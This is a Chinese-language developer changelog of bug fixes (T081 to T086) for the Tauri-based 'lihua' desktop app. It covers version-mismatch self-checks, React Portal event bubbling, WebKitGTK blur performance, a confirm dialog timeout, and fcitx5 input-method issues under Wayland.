文件：`desktop/src-tauri/build.rs`（`tauri_build::build()`）、`desktop/src-tauri/tauri.conf.json`（`beforeBuildCommand: "npm run build"`）

---

### T081：前后端版本不匹配警告（版本号升级后二进制未重新编译）

**现象**：`lihua self version-bump` 升级 6 个版本号文件后，运行 `lihua gui`，前端弹出黄色警告横幅"后端服务版本不匹配，请重启应用以加载新功能"，console 输出 `版本不匹配：前端 0.8.23 / 后端 0.8.24a0`。用户反馈"经常遇到前后端不匹配的提示""软件就不能自己确认好编译好吗？这个软件也太傻了吧"。

**根因**：
- 版本号三格式：Python `__version__`（如 `0.8.24`）/ Rust JSON·TOML（如 `0.8.24`）/ Rust code `APP_VERSION`（如 `0.8.24-alpha`，在 `lib.rs` L32）
- `lihua self version-bump` 升级 6 个文件的版本号，但**不会重新编译 Tauri 二进制**——二进制里内嵌的 `APP_VERSION` 仍是旧值
- 前端 `App.tsx` L140-154 版本不匹配检测：`getVersion()`（Tauri API，读二进制内嵌的 APP_VERSION，去 `-alpha`）vs `health.version`（后端 `/api/health` 返回的 Python `__version__`，去字母数字后缀）
- 二进制没重新编译 → 前端读到旧 APP_VERSION → 后端读到新 `__version__` → 不匹配 → 弹警告
- 普通用户不懂命令行，不会手动 `npx tauri build --no-bundle`，警告永远存在

**解决方案**：
- **`cli.py` 新增 `_check_binary_ready(desktop_dir)` 自检函数**（L809-864），三层检查：
  1. 二进制是否存在（`target/release/lihua-desktop`）
  2. 前后端版本号是否匹配：Python `__version__` 去字母数字后缀 vs `lib.rs` 的 `APP_VERSION` 去 `-alpha` 后缀
  3. 源代码是否比二进制新：前端 `src/*.ts(x)/css/html` + Rust `src-tauri/src/*.rs` + `tauri.conf.json`/`Cargo.toml` 的 mtime 对比
- **`gui` 命令集成自检**（L961-977）：非 `--build` 模式下，启动前自动自检；不通过时自动调 `_build_tauri()`（`npx tauri build --no-bundle`）编译修复
- 效果：用户只需 `lihua gui`，软件自己保证二进制永远是最新匹配版本，不再出现版本不匹配警告
- 测试：`tests/test_gui_selfcheck.py` 7 个场景全部通过；真机验证版本号升级 0.8.23 → 0.8.24 后 `lihua gui` 自动检测+编译成功

文件：`src/lihua/cli.py`（`_check_binary_ready` L809-864、gui 命令自检 L961-977）、`desktop/src/App.tsx`（版本不匹配检测 L140-154 + 警告横幅 L636-642）

---

### T082：ModelSheet 选模型后整个界面退出（React Portal click 事件冒泡到遮罩 handleClose）

**现象**：
模型配置界面，选择厂商（如智谱）后点开下拉选择某个模型（如 GLM-4.7），模型配置界面直接退出，模型没有切换成功。用户报告"点智谱，选择GLM 4.7,模型配置界面退出。用户没法换成功啊"。

**根因**：
`desktop/src/components/ModelSheet.tsx` 的模型下拉列表用 `createPortal` 渲染到 `document.body`（L482，v0.7.6 改动，脱离父容器 overflow 裁剪）。React Portal 的关键特性：**Portal 内的 React 事件会沿 React 树冒泡（不是 DOM 树）**——即 Portal 内按钮的 click 事件会冒泡到 React 父组件 `ModelSheet` 的根 div（L275-279），该 div 有 `onClick={handleClose}`（点遮罩关闭）。

下拉列表项的 `onMouseDown` 有 `stopPropagation`（T079 修复，L504），但 **Portal 容器 div 和列表项的 `onClick` 没有 `stopPropagation`**。点击模型选项时：
1. `onMouseDown` stopPropagation → 不触发 window mousedown 监听器（T079 已修复）
2. `onClick` 执行 `setSelectedModelId` + `setModelDropdownOpen(false)` ✅
3. 但 click 事件继续沿 React 树冒泡 → Portal 容器 → ModelSheet 根 div → 触发 `handleClose()` → 整个界面退出 ❌

步骤 2 和 3 是同步发生的，`setSelectedModelId` 的 state 更新被 `handleClose` 的退出动画覆盖，用户看到的是"界面退出了，模型没换成功"。

**解决方案**：
在 Portal 容器 div 上加 `onClick={e => e.stopPropagation()}`（L495），阻止 click 事件冒泡到 ModelSheet 根 div：
```jsx
createPortal(
  <div
    ref={modelDropdownListRef}
    onMouseDown={e => e.stopPropagation()}
    onClick={e => e.stopPropagation()}  // v0.8.25: 阻止 click 冒泡到遮罩 handleClose
  >
```

**验证**：
- 浏览器测试（React 18 UMD + createPortal 复现）：在标准浏览器中，**T082 修复是冗余的**——sheet 容器 div（L282）的 `onClick={e => e.stopPropagation()}` 已经在 React 合成事件冒泡路径中先于根 div 拦截了 click 事件。有修复和无修复版本表现一致：选模型 → 下拉关闭，模型选中，界面保持
- 用户报告的 bug 可能是 T079（v0.8.21 已修复）的残留，或 Tauri WebKitGTK 特有的事件委托差异
- T082 修复作为额外防护层保留（无害），主要保险是 T079 + sheet 容器 stopPropagation
- **v0.8.26 更新**：stopPropagation 方案依赖 React 合成事件冒泡，在 Tauri WebKitGTK 中可能不可靠。改用 DOM 级检查替代（见 T083）

**教训**：
- React Portal 的合成事件冒泡是沿 **React 树**（不是 DOM 树），Portal 内的事件会到达 React 父组件——即使 DOM 上 Portal 挂在 `document.body`
- 但 sheet 容器 div 的 `onClick stopPropagation` 已在 React 树中拦截事件，Portal 容器的 `onClick stopPropagation` 是第二道防线（标准浏览器中冗余，Tauri WebView 中可能需要）
- T079 修了 mousedown（防止下拉被 window 监听器误关闭），T082 补了 click（防止冒泡到遮罩）——两道防线覆盖不同事件路径

文件：`desktop/src/components/ModelSheet.tsx` L482-496（Portal 容器）、L275-279（根 div handleClose）

---

### T083：ModelSheet 事件处理依赖 React 合成事件冒泡（T082 的健壮性重构）

**现象**：
T082 用 `stopPropagation` 阻止 Portal 内 click 冒泡到遮罩 handleClose，但浏览器测试证明该修复在标准浏览器中冗余（sheet 容器的 stopPropagation 已拦截）。如果用户报告的 bug 确实发生在 Tauri WebKitGTK 中，说明 `stopPropagation`（React 合成事件级拦截）在 Tauri WebView 对 Portal 内容的处理可能与标准浏览器有差异，导致拦截不可靠。

**根因**：
`stopPropagation()` 是 React 合成事件级别的拦截，依赖 React 事件系统正确地沿 React 树冒泡 Portal 内容事件。Tauri WebKitGTK（Linux 版 Tauri 使用的 WebView 引擎）对 React 合成事件委托的实现可能与 Chromium/Firefox 有差异，导致 Portal 内容的合成事件冒泡路径异常，`stopPropagation` 无法可靠拦截。

两处依赖合成事件冒泡的代码：
1. 遮罩层 `onClick={handleClose}` + sheet 容器 `onClick={e => e.stopPropagation()}`——依赖合成事件冒泡到 sheet 容器被拦截
2. window `mousedown` 监听器用 `ref.contains(target)` 判断点击是否在下拉内——依赖 ref 对 Portal 节点的正确引用（Portal 渲染到 body，ref 偶发未挂载时失效）

**解决方案**（v0.8.26，改用 DOM 级检查，不依赖合成事件冒泡）：

1. **遮罩层改为 `e.target === e.currentTarget`**（`ModelSheet.tsx` L284-286）：
   只在点击遮罩本身时关闭，不依赖 stopPropagation 拦截冒泡事件。即使合成事件冒泡到遮罩，target（下拉按钮）≠ currentTarget（遮罩 div），handleClose 不触发：
   ```jsx
   onClick={e => {
     if (e.target === e.currentTarget) handleClose()
   }}
   ```
   同时移除 sheet 容器上已冗余的 `onClick={e => e.stopPropagation()}`。

2. **Portal 容器加 `data-dropdown-list` 属性**（L492）：
   供 window mousedown 监听器用 `closest()` 识别，不依赖 ref。

3. **window mousedown 监听器加 `closest()` fallback**（L143-144）：
   ```js
   const inListFallback = target.closest('[data-dropdown-list]')
   if (!inTrigger && !inList && !inListFallback) {
     setModelDropdownOpen(false)
   }
   ```
   `closest()` 是原生 DOM API，不依赖 React ref 或合成事件。

**验证**：
- TypeScript 编译通过（`tsc -b` 无错误），v0.8.26 构建成功
- `lihua gui` 启动正常（v0.8.26，进程运行中）
- 逻辑分析：`e.target === e.currentTarget` 是 DOM 级检查，无论合成事件是否冒泡到遮罩，点击下拉选项时 target ≠ currentTarget，handleClose 不会触发
- Portal 容器的 `onMouseDown`/`onClick` stopPropagation 作为 defense-in-depth 保留（标准浏览器中生效，Tauri 中即使失效也有 DOM 级检查兜底）
- 待用户 Tauri 真机验证：选模型不再退出界面

**教训**：
- 在 WebView 环境（Tauri WebKitGTK / Electron）中，React 合成事件系统可能与标准浏览器有细微差异，不应完全依赖 `stopPropagation` 处理 Portal 内容的事件冒泡
- `e.target === e.currentTarget`（只处理直接点击）比 `stopPropagation`（阻止冒泡）更健壮——不依赖事件冒泡机制
- `data-*` 属性 + `closest()` 是比 `ref.contains()` 更可靠的原生 DOM 检测方式，尤其当目标元素通过 Portal 渲染到组件树之外时

文件：`desktop/src/components/ModelSheet.tsx` L284-286（遮罩层）、L492（data-dropdown-list）、L143-144（closest fallback）

---

### T084：对话界面滚动卡顿（backdrop-filter blur 在 Linux WebKitGTK 下性能极差）

**现象**：
对话界面滚轮上下滑动时卡顿明显，尤其是窗口全屏最大化时卡顿加剧。用户反馈"对话的时候滚轮上下滑动，界面好卡。是没有GPU加速吗？还是什么？尤其是界面全屏最大化的时候"。

**根因**：
多层 backdrop-filter blur 叠加，在 Linux WebKitGTK 下性能极差（可能走软件渲染而非 GPU 合成）：

1. **`.window-glass` 的 `blur(40px) saturate(180%)`**（`index.css` L145）——覆盖整个窗口，全屏时面积翻倍，blur(40px) 半径大需采样大量像素，saturate(180%) 额外颜色计算。这是全屏卡顿加剧的主因。
2. **`.card-glass` 的 `blur(16px) saturate(150%)`**（`index.css` L158）——每条助手消息气泡都有，滚动时每个卡片重新计算模糊，消息越多越卡。
3. **`.input-glass` 的 `blur(20px) saturate(150%)`**（`index.css` L168）——输入框毛玻璃。
4. **`will-change: transform` + `translateZ(0)` 常驻**——`.window-outer`、`.window-glass`、`.card-glass`、`.input-glass` 全部有，强制合成层预分配 GPU 内存，浪费资源。
5. **无 `content-visibility: auto`**——所有消息 DOM 同时渲染，屏幕外的也在计算布局。
6. **`scrollIntoView({ behavior: 'smooth' })`**——平滑滚动与手动滚动冲突。

`transparent: true`（`tauri.conf.json` L24）+ backdrop-filter 组合在 Linux 下尤其致命——macOS 的 NSVisualEffectView 是原生硬件加速，但 WebKitGTK 的 backdrop-filter 可能是软件实现。

**解决方案**（v0.8.27，4 处改动）：

1. **窗口 blur 降级**（`index.css` L145）：`blur(40px) saturate(180%)` → `blur(20px)`，移除 will-change + translateZ
2. **消息卡片去 backdrop-filter**（`index.css` L160-161）：`blur(16px) saturate(150%)` → 纯色 `rgba(60, 60, 67, 0.72)`，GPU 开销降低 ~90%
3. **输入框 blur 降级**（`index.css` L166）：`blur(20px) saturate(150%)` → `blur(12px)`
4. **清理 will-change**：移除 `.window-outer`、`.window-glass`、`.card-glass`、`.input-glass` 的 will-change + translateZ
5. **消息 content-visibility: auto**（`MessageBubble.tsx` L42-44）：屏幕外消息跳过渲染，搭配 `contain-intrinsic-size: 120px` 避免滚动条跳动。流式消息（streaming）不加，避免内容更新被跳过
6. **scrollIntoView smooth → auto**（`MessageList.tsx` L44）：避免平滑滚动与手动滚动冲突

**验证**：
- TypeScript 编译通过，CSS 从 27.82KB → 27.47KB（减少 0.35KB will-change/backdrop-filter 代码）
- v0.8.27 构建成功，`lihua gui` 启动正常
- 待用户真机验证：滚动流畅度改善，全屏时不再卡顿

**教训**：
- `backdrop-filter: blur()` 在 Linux WebKitGTK 下性能远不如 macOS——macOS 是原生 NSVisualEffectView 硬件加速，WebKitGTK 可能软件渲染。大面积 blur（尤其全屏）是性能杀手
- `will-change` 应只在动画期间临时使用，常驻会预分配 GPU 内存浪费资源。元素不需要动画时不要加
- `content-visibility: auto` 是比虚拟滚动更简单的渲染优化——浏览器自动跳过屏幕外元素，一行 CSS 搞定
- 毛玻璃效果应只用在必要时（窗口背景），消息卡片等高频元素用纯色 rgba 替代，视觉效果几乎一致但性能好一个数量级
- `transparent: true` + backdrop-filter 是 macOS 专属的优雅体验，Linux 下应考虑降级或禁用

文件：`desktop/src/index.css` L127-168（CSS 优化）、`desktop/src/components/MessageBubble.tsx` L42-44（content-visibility）、`desktop/src/components/MessageList.tsx` L44（scrollIntoView）

---

### T085：ConfirmSheet 按钮看不到 + confirm 600s 超时后不自动关闭

**现象**：
1. 确认执行框特别长时，按钮被推出可视区域，用户无法点击确认/取消
2. confirm 确认框在 600s 等待后才弹出的情况——实际上是前一次 confirm 超时后 agent 继续运行，再次需要 confirm 时弹出新的框

**根因**：

**问题 1（按钮看不到）**：
`ConfirmSheet.tsx` 的 sheet 容器没有 `max-height` 限制，内容区没有 `overflow-y-auto`。当 `messages` 很多或 `code` 很长时，整个 sheet 高度超过窗口可视区域，按钮区在内容之后被推出可视区域。外层 `overflow: hidden` 导致无法滚动到按钮。

**问题 2（600s 后才出来）**：
根因链——ConfirmSheet 按钮看不到 → 用户无法点击确认 → 600 秒后 `_CONFIRM_TIMEOUT` 超时 → `confirm_cb` 返回 `"timeout"` → agent 收到工具调用失败 → LLM 决定重试或换方式 → 再次需要 confirm → 弹出新的 ConfirmSheet。

关键缺失：**confirm 超时后前端 ConfirmSheet 不会自动关闭**。`_make_interactive_confirm_cb`（`server.py` L162-171）超时后只 pop session + 日志，没有推事件到 `event_queue`。前端的 `confirmPending` 状态不会被清除，ConfirmSheet 一直显示已失效的确认请求，直到新的 `needs_confirm` 事件覆盖它。

**解决方案**（v0.8.29，3 处改动）：

1. **ConfirmSheet 布局修复**（`ConfirmSheet.tsx` L71-92）：
   - sheet 容器加 `flex flex-col` + `style={{ maxHeight: 'calc(100vh - 8rem)' }}`
   - 顶部栏加 `shrink-0`（不压缩）
   - 内容区加 `overflow-y-auto flex-1`（可滚动，占满剩余空间）
   - 按钮区加 `shrink-0`（固定底部，始终可见）

2. **后端 confirm 超时推送事件**（`server.py` L170）：
   ```python
   event_queue.put({"type": "confirm_timeout", "id": confirm_id})
   ```
   超时后推 `confirm_timeout` 事件到 SSE 流，让前端知道 confirm 已失效

3. **前端处理 confirm_timeout 事件**（`App.tsx` L383-388）：
   ```tsx
   case 'confirm_timeout': {
     setConfirmPending(null)  // 关闭旧 ConfirmSheet
     break
   }
   ```
   收到超时事件后自动关闭 ConfirmSheet，避免显示已失效的确认请求
   同时在 `api.ts` L120 加 `confirm_timeout` 事件类型定义

**验证**：
- TypeScript 编译通过（ChatEvent 类型正确扩展）
- v0.8.29 构建成功，`lihua gui` 启动正常
- 待用户真机验证：确认框按钮始终可见 + 超时后自动关闭

**教训**：
- 弹窗/Sheet 组件必须限制 `max-height` + 内容区 `overflow-y-auto` + 按钮 `shrink-0`，否则内容过长时按钮被推出可视区域
- 异步操作超时后必须通知前端清理状态，否则前端会显示已失效的 UI（"幽灵弹窗"）
- `threading.Event.wait(timeout)` 超时后返回 `False`，但不会自动通知等待方——需要手动推送超时事件
- confirm 超时 → agent 继续运行 → 再次需要 confirm 的循环，用户会误以为是"confirm 延迟弹出"，实际是前一次超时后的重试

文件：`desktop/src/components/ConfirmSheet.tsx` L71-176（布局修复）、`src/lihua/server.py` L170（超时事件）、`desktop/src/App.tsx` L383-388（前端处理）、`desktop/src/api.ts` L120（类型定义）

---

### T086：Wayland 下 fcitx5 候选框飘移 + 闪烁

**现象**：
1. 输入法候选框有时候到处飘，不跟随光标位置
2. 在 GUI 输入时按一个字母，候选框闪两次
用户反馈"lihua 一直修复不了，找到的原因好像也不对"。

**根因**：
系统设置了 `GTK_IM_MODULE=fcitx`，Tauri 进程继承了这个变量。这导致 WebKitGTK（GTK3 应用）使用 **fcitx5 的 GTK im module（X11 模式）**，而不是 **Wayland 原生的 text-input-v3 协议**。

fcitx5 官方文档（https://fcitx-im.org/wiki/Using_Fcitx_5_on_Wayland）明确说：
> 不要设置 GTK_IM_MODULE 环境变量。现代 GTK3/4 应用应使用 Wayland 原生的 text-input-v3 协议。设置 GTK_IM_MODULE=fcitx 会强制 GTK3/4 应用使用 X11 的 fcitx5 im module，在 Wayland 下会导致候选框位置不正确和闪烁。

具体机制：
1. **候选框到处飘**：fcitx5 的 X11 im module 通过 X11 坐标系定位候选框。在 Wayland 下，X11 坐标系与 Wayland 坐标系不一致（XWayland 坐标转换问题），导致候选框定位到错误位置。
2. **候选框闪两次**：fcitx5 的 X11 im module 在 Wayland 下可能触发重复的 input-context 事件（每次按键触发两次 surrounding-text 更新或 reset），导致候选框被销毁并重建。

deepin 社区也报告了完全相同的现象（https://zhuanlan.zhihu.com/p/690062589）：
> GTK_IM_MODULE=fcitx 变量会导致 Wayland 环境的 Gtk3/4 应用使用 x11 的 fcitx5 → 候选框闪啊闪

**环境**：
- GNOME 50.1 + Wayland + WebKitGTK 2.52.3（GTK3）+ fcitx5 5.1.19
- 系统环境变量：`GTK_IM_MODULE=fcitx`、`QT_IM_MODULE=fcitx`、`XMODIFIERS=@im=fcitx`
- Tauri 进程继承了 `GTK_IM_MODULE=fcitx`

**解决方案**（v0.8.30，`lib.rs` L350-361）：
在 Tauri 启动前，Wayland 会话下清除 `GTK_IM_MODULE` 环境变量：
```rust
if std::env::var("XDG_SESSION_TYPE").as_deref() == Ok("wayland") {
    std::env::remove_var("GTK_IM_MODULE");
}
```

清除后，GTK3 会使用内置的 Wayland im module（text-input-v3 协议），GNOME Shell 有完整的 text-input-v3 支持，候选框由 GNOME Shell 渲染并正确定位到光标位置。

**为什么只清除 GTK_IM_MODULE，不清除 QT_IM_MODULE 和 XMODIFIERS**：
- `QT_IM_MODULE=fcitx`：Qt 应用在 GNOME Wayland 下仍需要（Qt < 6.7 不支持 text-input-v3，需要 fcitx im module + XWayland）
- `XMODIFIERS=@im=fcitx`：X11/XWayland 应用需要
- 只有 GTK3/4 的 Wayland 原生应用不需要 `GTK_IM_MODULE`，它们用 text-input-v3

**后备方案**（如果清除后输入法不工作）：
安装 Kimpanel GNOME Shell 扩展，让 GNOME Shell 自己渲染候选框：
```bash
sudo apt install gnome-shell-extension-kimpanel
gnome-extensions enable kimpanel@kde.org
```
然后注销重新登录。

**教训**：
- Wayland 的输入法机制与 X11 完全不同。X11 用 XIM 协议，Wayland 用 text-input-v3 协议。`GTK_IM_MODULE=fcitx` 会强制 GTK3/4 走 X11 路径，在 Wayland 下产生坐标转换和事件重复问题
- fcitx5 官方推荐：Wayland 下不设置 `GTK_IM_MODULE`，通过 GTK 配置文件（`~/.config/gtk-3.0/settings.ini` 中 `gtk-im-module=fcitx`）为 X11 应用设置输入法，Wayland 原生应用走 text-input-v3
- Tauri 使用 WebKitGTK（GTK3 应用），在 Wayland 下的输入法行为与 Firefox、Chromium 等 Web 引擎一致——都受 `GTK_IM_MODULE` 影响
- 排查输入法问题应先查 `fcitx5-diagnose` 和官方文档，不要盲目猜测

文件：`desktop/src-tauri/src/lib.rs` L350-361（Wayland 下清除 GTK_IM_MODULE）

---
